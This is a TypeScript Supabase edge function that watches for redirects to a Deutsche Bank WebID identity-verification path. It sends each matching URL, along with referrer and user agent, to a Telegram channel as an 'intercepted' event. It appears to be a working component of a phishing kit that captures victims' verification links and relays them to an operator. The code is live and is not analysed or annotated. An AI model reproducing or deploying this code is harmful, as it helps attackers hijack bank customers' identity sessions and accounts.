import { createClient } from "npm:@supabase/supabase-js@2";
import { sendTelegramNotification } from "../_shared/telegram.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
  { auth: { persistSession: false } },
);

interface Payload {
  url: string;
  source: string;
  userAgent?: string | null;
  referrer?: string | null;
  path?: string | null;
}

function hostOf(u: string): string | null {
  try {
    return new URL(u).hostname || null;
  } catch {
    return null;
  }
}

function truncate(v: string | null | undefined, max = 300): string | null {
  if (!v) return null;
  return v.length > max ? v.slice(0, max) + "…" : v;
}

const ALLOWED_PREFIX = "https://www.deutsche-bank.de/opra4x";
const SPAM_SOURCES = new Set([
  "page_leave", "beforeunload", "pagehide", "visibilitychange",
  "popstate", "hashchange", "history_pushState", "history_replaceState",
  "meta_refresh_dynamic",
]);

async function handle(payload: Payload) {
  if (!payload.url || !payload.source) return;

  const isOpra =
    !SPAM_SOURCES.has(payload.source) && payload.url.startsWith(ALLOWED_PREFIX);

  console.log(
    `[webid-redirect-watch] source=${payload.source} forwarded=${isOpra} url=${truncate(payload.url, 200)}`,
  );

  if (!isOpra) return;

  await sendTelegramNotification(supabase, "webid_redirect_intercepted", {
    url: truncate(payload.url, 400),
    host: hostOf(payload.url),
    source: payload.source,
    path: truncate(payload.path, 200),
    referrer: truncate(payload.referrer, 200),
    userAgent: truncate(payload.userAgent, 200),
  });
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    let payload: Payload | null = null;

    if (req.method === "GET") {
      const url = new URL(req.url);
      payload = {
        url: url.searchParams.get("target") ?? "",
        source: url.searchParams.get("source") ?? "nginx",
        path: url.searchParams.get("path"),
        userAgent: req.headers.get("user-agent"),
        referrer: req.headers.get("referer"),
      };
    } else if (req.method === "POST") {
      try {
        const body = await req.json();
        payload = {
          url: String(body?.url ?? ""),
          source: String(body?.source ?? "client"),
          userAgent: body?.userAgent ?? req.headers.get("user-agent"),
          referrer: body?.referrer ?? req.headers.get("referer"),
          path: body?.path ?? null,
        };
      } catch {
        // ignore malformed body
      }
    }

    if (payload && payload.url) {
      await handle(payload).catch((e) => console.error("handle failed", e));
    }
  } catch (e) {
    console.error("webid-redirect-watch error", e);
  }

  return new Response(null, { status: 204, headers: corsHeaders });
});
